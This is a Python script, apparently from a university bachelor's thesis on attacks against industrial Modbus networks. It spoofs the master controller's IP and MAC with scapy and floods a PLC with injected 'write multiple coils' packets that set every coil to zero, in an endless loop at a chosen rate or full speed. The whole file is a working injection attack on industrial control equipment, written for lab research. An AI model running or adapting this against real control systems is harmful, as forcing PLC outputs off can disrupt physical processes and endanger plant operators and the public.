# Solution for BACHELOR’S THESIS: atack generation on industrial modbus network 
# File name: injection-simple.py 
# Authors: Jakub Kuzník <xkuzni04>
# institution: VUT FIT 
# Description: Program is injecting wrong modbus packets.
# Execution: ./injection.py num 
#              where num is number of injected packets p.s. 
#                    num == 0 ==> full speed 

import sys
from scapy.all import * 
import random 
from pyModbusTCP.client import ModbusClient

# Device that i am attacking 
PLC2          = "192.168.88.252"  # PLC2
PLC2_MAC      = "b8:27:eb:1e:08:59"
PLC2_UNIT_ID  = 1
MASTER_IP     = "192.168.88.250"
MASTER_MAC    = "1c:69:7a:08:86:1a"
SERVER_PORT   = 502
PACKET_P_S    = 0

## Will create a modbus packet 
# 
#
# write 0 to every coil: 
#   4c b1 00 00 00 08 01 0f 00 00 00 04 01 00
def build_packet(src_ip, dst_ip, src_mac, dst_mac, transaction_id, lenght, unit_id, function_code, raw_data):
  
  ## lenght of raw data in bytes 
  raw_data_len = lenght - 2
  ## raw data in byte format 
  raw_data_bytes = raw_data.to_bytes(raw_data_len, byteorder='big')

  protocol_id = 0x0000

  # H = 2B
  # B = 1B 
  data_format = ">HHHBB" + str(raw_data_len) + "s"
  print("format ", data_format, " kulo ", raw_data_bytes)    

  # assembly packet application layer 
  modbus_payload = struct.pack(data_format, transaction_id, protocol_id, lenght, unit_id, function_code, raw_data_bytes)
  print(modbus_payload)
  # Create IP and TCP headers
  ip_header = IP(src=src_ip, dst=dst_ip)
  tcp_header = TCP(dport=SERVER_PORT)

  # Create Ethernet header
  eth_header = Ether(src=MASTER_MAC, dst="22:22:22:22:22:22", type=0x0800 )

  # Create Modbus/TCP packet
  modbus_packet = eth_header / ip_header / tcp_header / modbus_payload

  print(eth_header)
 

  return modbus_packet

def parse_args():
    global PACKET_P_S 
    PACKET_P_S = int(sys.argv[1])


parse_args()

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("eno2", 0))


while True:
    transaction_id = random.randint(0, 65535)
    lenght         = 8
    function_code  = 15
    
    # 6b write multile coils with zeros 
    raw_data = 0x000000040100

    modbus_packet1 = build_packet(MASTER_IP ,PLC2, MASTER_MAC, PLC2_MAC, transaction_id, lenght, PLC2_UNIT_ID, function_code, raw_data)
    
    s.send(bytes(modbus_packet1))
    
    ## full speed 
    if PACKET_P_S == 0:
        pass
    
    ## 
    else:
        wait_time = 1.00 / PACKET_P_S
        time.sleep(wait_time)
        pass






    